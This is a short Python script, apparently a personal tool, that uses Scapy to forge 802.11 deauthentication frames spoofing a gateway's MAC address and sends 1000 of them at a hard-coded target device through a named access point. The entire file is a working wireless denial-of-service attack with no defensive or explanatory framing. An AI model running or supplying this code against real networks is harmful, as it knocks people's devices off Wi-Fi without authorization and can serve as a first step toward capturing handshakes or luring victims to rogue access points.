from scapy.all import *

target_mac = "A4:83:E7:2F:3F:06"
#ipadmac = "CA:AF:58:1D:78:1D"
#brdmac = "FF:FF:FF:FF:FF:FF"
ap_mac = "00:8a:76:e8:61:bc"
gateway_mac = "AC:DB:48:1D:3A:92"
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=ap_mac)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth()
# send the packet
sendp(packet, inter=0.02, count=1000, iface="en1")